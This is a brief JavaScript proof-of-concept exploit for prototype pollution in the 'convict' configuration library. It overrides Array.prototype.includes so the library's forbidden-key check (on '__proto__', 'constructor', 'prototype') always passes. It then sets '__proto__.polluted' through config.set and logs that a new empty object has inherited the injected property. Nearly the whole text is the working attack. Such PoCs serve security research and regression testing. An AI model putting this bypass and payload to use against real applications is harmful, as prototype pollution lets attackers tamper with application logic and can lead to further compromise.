Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const convict = require('convict');
let obj = {};
const config = convict(obj);
console.log({}.polluted);
config.set('__proto__.polluted', 'yes');
console.log({}.polluted);